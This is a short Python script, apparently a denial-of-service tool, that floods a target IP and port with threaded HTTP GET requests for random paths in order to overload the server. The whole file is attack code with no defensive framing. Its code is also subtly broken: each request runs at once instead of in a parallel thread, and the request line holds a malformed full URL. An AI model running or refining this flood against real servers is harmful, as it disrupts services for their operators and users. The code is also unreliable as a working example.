# HTTP flood attack

import random
import socket
import string
import threading
import time

from scapy.all import *

def http_flood_attack(ipaddr,port,num):# A function for the HTTP flood attack
	threads = list()
	print("Running HTTP flood...")
	for index in range(num):# Create a number of threads to send HTTP requests
		thread = threading.Thread(target=makeRequest(ipaddr,port))
		thread.start()
		threads.append(thread)
	
	for index, thread in enumerate(threads):# Wait for all threads to finish
		thread.join()
	
def makeRequest(ip, p):# A function to make an HTTP request to the target server
	url_path = generate_url_path(12)
	dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	try:
		
		dos.connect((ip,p))
		msg = "GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, ip)
		byt = msg.encode()
		dos.send(byt)
		
	except socket.error:
		print("\n [ No connection, server might be down ]: "+ str(socket.error))
	
	finally:
		dos.shutdown(socket.SHUT_RDWR)
		dos.close()
		
def generate_url_path(length=10):# A function to generate a random URL path
	characters = string.ascii_letters + string.digits
	random_url = ''.join(random.choice(characters) for _ in range(length))
	return f'https://www.example.com/{random_url}'	


	
	
	


